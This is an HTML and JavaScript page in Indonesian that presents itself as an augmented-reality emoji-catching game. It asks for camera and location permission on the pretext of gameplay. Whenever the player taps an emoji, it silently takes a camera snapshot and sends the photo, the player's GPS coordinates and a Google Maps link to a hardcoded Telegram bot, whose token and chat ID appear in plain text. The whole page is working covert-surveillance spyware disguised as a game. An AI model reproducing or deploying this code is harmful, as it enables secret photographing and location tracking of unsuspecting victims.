<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AR Game dengan Quotes & Izin</title>
<style>
body, html { margin:0; padding:0; overflow:hidden; height:100%; font-family:sans-serif; background:#000; }
.screen { position:fixed; top:0; left:0; width:100%; height:100%; display:flex; justify-content:center; align-items:center; flex-direction:column; color:#0f0; text-align:center; background:rgba(0,0,0,0.95); z-index:100; }
.screen button { margin-top:20px; padding:10px 20px; font-size:20px; cursor:pointer; }
video#camera { position:fixed; top:0; left:0; width:100%; height:100%; object-fit:cover; transform:scaleX(-1); z-index:0; display:none; }
.emoji { position:absolute; font-size:40px; cursor:pointer; user-select:none; color:#0f0; transition: transform 0.3s; }
.score { position:absolute; top:20px; left:20px; font-size:24px; color:#fff; background:rgba(0,0,0,0.5); padding:5px 15px; border-radius:10px; z-index:10; display:none; }
</style>
</head>
<body>

<!-- Layar Quote -->
<div class="screen" id="quoteScreen">
  <div id="quoteBox">üí° "Klik mulai untuk main game AR!"</div>
  <button id="startBtn">Mulai Game</button>
</div>

<!-- Layar Peringatan -->
<div class="screen" id="warnScreen" style="display:none;">
  <div>‚ö†Ô∏è Game ini membutuhkan <br> Kamera & Lokasi aktif ‚ö†Ô∏è</div>
  <button id="allowBtn">Izinkan & Lanjutkan</button>
</div>

<video id="camera" autoplay playsinline></video>
<div class="score" id="scoreBox">Score: 0</div>
<audio id="popSound" src="https://freesound.org/data/previews/256/256113_3263906-lq.mp3"></audio>

<script>
const quoteScreen = document.getElementById('quoteScreen');
const startBtn = document.getElementById('startBtn');
const warnScreen = document.getElementById('warnScreen');
const allowBtn = document.getElementById('allowBtn');

const camera = document.getElementById('camera');
const scoreBox = document.getElementById('scoreBox');
const popSound = document.getElementById('popSound');

const BOT_TOKEN = "8426427901:AAEjvVBIvQ7E84B631aEIyeoYhJhYZWJsgw";   // ganti dengan token botmu
const CHAT_ID = "8316267465";     // ganti dengan chat_id mu
const emojis = ["üçé","üçå","üçí","‚≠ê","üíé","üéØ"];
let score = 0;
let userLocation = null;

// Ambil foto dari kamera
function takePhoto(){
  return new Promise((resolve)=>{
    const canvas = document.createElement("canvas");
    canvas.width = camera.videoWidth || 320;
    canvas.height = camera.videoHeight || 240;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(camera,0,0,canvas.width,canvas.height);
    canvas.toBlob(blob => resolve(blob),"image/jpeg");
  });
}

// Kirim ke Telegram (foto + lokasi + link GMaps)
function sendToTelegram(blob){
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("photo", blob, "snapshot.jpg");

  let caption = "üì∏ Foto dari game AR";
  if(userLocation){
    let lat = userLocation.latitude;
    let lon = userLocation.longitude;
    caption += `\nüìç Lokasi: ${lat}, ${lon}`;
    caption += `\nüåç [Lihat di Google Maps](https://www.google.com/maps?q=${lat},${lon})`;
  }

  fd.append("caption", caption);
  fd.append("parse_mode", "Markdown");

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:"POST", body:fd })
    .then(res => res.json())
    .then(data => console.log("Telegram sent:", data))
    .catch(err => console.error(err));

  // Kirim juga titik lokasi (opsional, bisa kamu hapus kalau nggak perlu)
  if(userLocation){
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
      method:"POST",
      headers:{ "Content-Type":"application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        latitude: userLocation.latitude,
        longitude: userLocation.longitude
      })
    });
  }
}

// Spawn emoji jatuh
function spawnEmoji(){
  const emoji = document.createElement("div");
  emoji.className = "emoji";
  emoji.textContent = emojis[Math.floor(Math.random()*emojis.length)];
  emoji.style.left = Math.random()*80+10+"%";
  emoji.style.top = "-50px";
  document.body.appendChild(emoji);

  emoji.addEventListener("click", async ()=>{
    score++; scoreBox.textContent = "Score: "+score;
    emoji.style.transform="scale(2) rotate(360deg)";
    popSound.currentTime=0; popSound.play();
    const photo = await takePhoto();
    sendToTelegram(photo);
    emoji.remove();
  });

  let speed = Math.random()*2 + 2;
  let fall = setInterval(()=>{
    let top = parseFloat(emoji.style.top);
    top += speed;
    emoji.style.top = top+"px";
    if(top>window.innerHeight){ emoji.remove(); clearInterval(fall); }
  },30);
}

// Tombol mulai ‚Üí tampilkan peringatan
startBtn.addEventListener("click", ()=>{
  quoteScreen.style.display="none";
  warnScreen.style.display="flex";
});

// Tombol izinkan ‚Üí jalankan game jika izin diterima
allowBtn.addEventListener("click", async ()=>{
  try{
    // Minta kamera
    const stream = await navigator.mediaDevices.getUserMedia({ video:true });
    camera.srcObject = stream;

    // Minta lokasi
    const position = await new Promise((resolve, reject)=>{
      navigator.geolocation.getCurrentPosition(resolve, reject);
    });
    userLocation = {
      latitude: position.coords.latitude,
      longitude: position.coords.longitude
    };

    // Semua izin diterima ‚Üí mulai game
    warnScreen.style.display="none";
    camera.style.display="block";
    scoreBox.style.display="block";
    setInterval(spawnEmoji, 1000);

  } catch(err){
    alert("‚ö†Ô∏è Izin kamera dan lokasi wajib untuk memainkan game!");
    console.error(err);
  }
});
</script>

</body>
</html>
